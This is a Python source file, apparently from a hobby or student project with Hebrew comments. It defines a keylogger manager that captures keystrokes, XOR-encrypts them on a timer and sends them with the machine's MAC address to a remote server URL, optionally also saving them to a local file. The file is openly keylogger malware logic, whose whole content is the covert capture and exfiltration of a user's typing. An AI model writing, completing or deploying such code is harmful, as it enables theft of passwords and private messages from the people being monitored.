from KeyLoggerService import KeyLoggerService
from network_writer import NetworkWriter
from FileWriter import FileWriterWithTime
from Encryptor import XorEncryptor
from Get_mac import get_mac_address
import time


class KeyLoggerManager:
    """ניהול התוכנה בעזרת קבצי העזר"""

    def __init__(self, timer: int, encryption_key: int | str, url: str, save_to_file: bool = False):
        """אתחול ניהול מקלדת עם טיימר והצפנה"""
        self.timer = timer
        self.encryption_key = encryption_key
        self.save_to_file = save_to_file
        self.is_running = False
        self.logger = KeyLoggerService()
        self.encryptor = XorEncryptor()
        self.network_writer = NetworkWriter(url)
        self.mac_address = get_mac_address()
        self.file_writer = FileWriterWithTime() if save_to_file else None  # יצירת אובייקט רק אם צריך

    def start(self):
        """מתחיל מעקב והרצת הקבצים הנדרשים"""
        self.is_running = True
        self.logger.start_logging()
        try:
            while self.is_running:
                time.sleep(self.timer)
                logged_keys = self.logger.get_logged_keys()
                if logged_keys:  # אם היו הקלדות
                    encrypted_data = self.encryptor.encrypt(logged_keys, self.encryption_key) # הצפנה
                    self.network_writer.send_data(encrypted_data, self.mac_address) # שליחה לשרת
                    if self.save_to_file:
                        self.file_writer.send_data(encrypted_data, 'Key_logger.txt') # כתיבה לקובץ
        except Exception as e:
            self.network_writer.send_error(e)
        finally:
            self.stop()

    def stop(self):
        """עצירת המעקב"""
        self.is_running = False
        self.logger.stop_logging()

# הושלם